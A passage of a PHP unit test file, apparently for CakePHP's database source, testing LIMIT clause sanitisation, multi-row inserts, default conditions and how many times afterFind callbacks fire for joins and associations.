		$result = $db->limit('FARTS', 'BOOGERS');
		$this->assertEquals(' LIMIT 0, 0', $result);

		$result = $db->limit(20, 10);
		$this->assertEquals(' LIMIT 10, 20', $result);

		$result = $db->limit(10, 300000000000000000000000000000);
		$scientificNotation = sprintf('%.1E', 300000000000000000000000000000);
		$this->assertNotContains($scientificNotation, $result);
	}

/**
 * Test insertMulti with id position.
 *
 * @return void
 */
	public function testInsertMultiId() {
		$this->loadFixtures('Article');
		$Article = ClassRegistry::init('Article');
		$db = $Article->getDatasource();
		$datetime = date('Y-m-d H:i:s');
		$data = array(
			array(
				'user_id' => 1,
				'title' => 'test',
				'body' => 'test',
				'published' => 'N',
				'created' => $datetime,
				'updated' => $datetime,
				'id' => 100,
			),
			array(
				'user_id' => 1,
				'title' => 'test 101',
				'body' => 'test 101',
				'published' => 'N',
				'created' => $datetime,
				'updated' => $datetime,
				'id' => 101,
			)
		);
		$result = $db->insertMulti('articles', array_keys($data[0]), $data);
		$this->assertTrue($result, 'Data was saved');

		$data = array(
			array(
				'id' => 102,
				'user_id' => 1,
				'title' => 'test',
				'body' => 'test',
				'published' => 'N',
				'created' => $datetime,
				'updated' => $datetime,
			),
			array(
				'id' => 103,
				'user_id' => 1,
				'title' => 'test 101',
				'body' => 'test 101',
				'published' => 'N',
				'created' => $datetime,
				'updated' => $datetime,
			)
		);

		$result = $db->insertMulti('articles', array_keys($data[0]), $data);
		$this->assertTrue($result, 'Data was saved');
	}

/**
 * Test defaultConditions()
 *
 * @return void
 */
	public function testDefaultConditions() {
		$this->loadFixtures('Article');
		$Article = ClassRegistry::init('Article');
		$db = $Article->getDataSource();

		// Creates a default set of conditions from the model if $conditions is null/empty.
		$Article->id = 1;
		$result = $db->defaultConditions($Article, null);
		$this->assertEquals(array('Article.id' => 1), $result);

		// $useAlias == false
		$Article->id = 1;
		$result = $db->defaultConditions($Article, null, false);
		$this->assertEquals(array($db->fullTableName($Article, false) . '.id' => 1), $result);

		// If conditions are supplied then they will be returned.
		$Article->id = 1;
		$result = $db->defaultConditions($Article, array('Article.title' => 'First article'));
		$this->assertEquals(array('Article.title' => 'First article'), $result);

		// If a model doesn't exist and no conditions were provided either null or false will be returned based on what was input.
		$Article->id = 1000000;
		$result = $db->defaultConditions($Article, null);
		$this->assertNull($result);

		$Article->id = 1000000;
		$result = $db->defaultConditions($Article, false);
		$this->assertFalse($result);

		// Safe update mode
		$Article->id = 1000000;
		$Article->__safeUpdateMode = true;
		$result = $db->defaultConditions($Article, null);
		$this->assertFalse($result);
	}

/**
 * Test that count how many times is afterFind called
 *
 * @return void
 */
	public function testCountAfterFindCalls() {
		$this->loadFixtures('Article', 'User', 'Comment', 'Attachment', 'Tag', 'ArticlesTag');

		// Use alias to make testing "primary = true" easy
		$Primary = $this->getMock('Comment', array('afterFind'), array(array('alias' => 'Primary')), '', true);
		$Primary->expects($this->any())->method('afterFind')->will($this->returnArgument(0));

		$Article = $this->getMock('Article', array('afterFind'), array(), '', true);
		$User = $this->getMock('User', array('afterFind'), array(), '', true);
		$Comment = $this->getMock('Comment', array('afterFind'), array(), '', true);
		$Tag = $this->getMock('Tag', array('afterFind'), array(), '', true);
		$Attachment = $this->getMock('Attachment', array('afterFind'), array(), '', true);

		$Primary->Article = $Article;
		$Primary->Article->User = $User;
		$Primary->Article->Tag = $Tag;
		$Primary->Article->Comment = $Comment;
		$Primary->Attachment = $Attachment;
		$Primary->Attachment->Comment = $Comment;
		$Primary->User = $User;

		// primary = true
		$Primary->expects($this->once())
			->method('afterFind')->with($this->anything(), $this->isTrue())->will($this->returnArgument(0));

		// primary = false
		$Article->expects($this->once()) // Primary belongs to 1 Article
			->method('afterFind')->with($this->anything(), $this->isFalse())->will($this->returnArgument(0));
		$User->expects($this->exactly(2)) // Article belongs to 1 User and Primary belongs to 1 User
			->method('afterFind')->with($this->anything(), $this->isFalse())->will($this->returnArgument(0));
		$Tag->expects($this->exactly(2)) // Article has 2 Tags
			->method('afterFind')->with($this->anything(), $this->isFalse())->will($this->returnArgument(0));
		$Comment->expects($this->exactly(3)) // Article has 2 Comments and Attachment belongs to 1 Comment
			->method('afterFind')->with($this->anything(), $this->isFalse())->will($this->returnArgument(0));
		$Attachment->expects($this->once()) // Primary has 1 Attachment
			->method('afterFind')->with($this->anything(), $this->isFalse())->will($this->returnArgument(0));

		$result = $Primary->find('first', array('conditions' => array('Primary.id' => 5), 'recursive' => 2));
		$this->assertCount(2, $result['Article']['Tag']);
		$this->assertCount(2, $result['Article']['Comment']);
	}

/**
 * Test that afterFind is called correctly for 'joins'
 *
 * @return void
 */
	public function testJoinsAfterFind() {
		$this->loadFixtures('Article', 'User');

		$User = new User();
		$User->bindModel(array('hasOne' => array('Article')));

		$Article = $this->getMock('Article', array('afterFind'), array(), '', true);
		$Article->expects($this->once())
			->method('afterFind')
			->with(
				array(
					0 => array(
						'Article' => array(
							'id' => '1',
							'user_id' => '1',
							'title' => 'First Article',
							'body' => 'First Article Body',
							'published' => 'Y',
							'created' => '2007-03-18 10:39:23',
							'updated' => '2007-03-18 10:41:31'
						)
					)
				),
				$this->isFalse()
			)
			->will($this->returnArgument(0));

		$User->Article = $Article;
		$User->find('first', array(
			'fields' => array(
				'Article.id',
				'Article.user_id',
				'Article.title',
				'Article.body',
				'Article.published',
				'Article.created',
				'Article.updated'
			),
			'conditions' => array('User.id' => 1),
			'recursive' => -1,
			'joins' => array(
				array(
					'table' => 'articles',
					'alias' => 'Article',
					'type' => 'LEFT',
					'conditions' => array(
						'Article.user_id = User.id'
					),
				)
			),
			'order' => array('Article.id')
		));
	}

/**
 * Test that afterFind is called correctly for 'hasOne' association.
 *
 * @return void
 */
	public function testHasOneAfterFind() {
		$this->loadFixtures('Article', 'User', 'Comment');

		$User = new User();
		$User->bindModel(array('hasOne' => array('Article')));

		$Article = $this->getMock('Article', array('afterFind'), array(), '', true);
		$Article->unbindModel(array(
			'belongsTo' => array('User'),
			'hasMany' => array('Comment'),
			'hasAndBelongsToMany' => array('Tag')
		));
		$Article->bindModel(array(
			'hasOne' => array('Comment'),
		));
		$Article->expects($this->once())
			->method('afterFind')
			->with(
				$this->equalTo(
					array(
						0 => array(
							'Article' => array(
								'id' => '1',
								'user_id' => '1',
								'title' => 'First Article',
								'body' => 'First Article Body',
								'published' => 'Y',
								'created' => '2007-03-18 10:39:23',
								'updated' => '2007-03-18 10:41:31',
								'Comment' => array(
									'id' => '1',
									'article_id' => '1',
									'user_id' => '2',
									'comment' => 'First Comment for First Article',
									'published' => 'Y',
									'created' => '2007-03-18 10:45:23',
									'updated' => '2007-03-18 10:47:31',
								)
							)
						)
					)
				),
				$this->isFalse()
			)
			->will($this->returnArgument(0));

		$User->Article = $Article;
		$User->find('first', array('conditions' => array('User.id' => 1), 'recursive' => 2));
	}
}
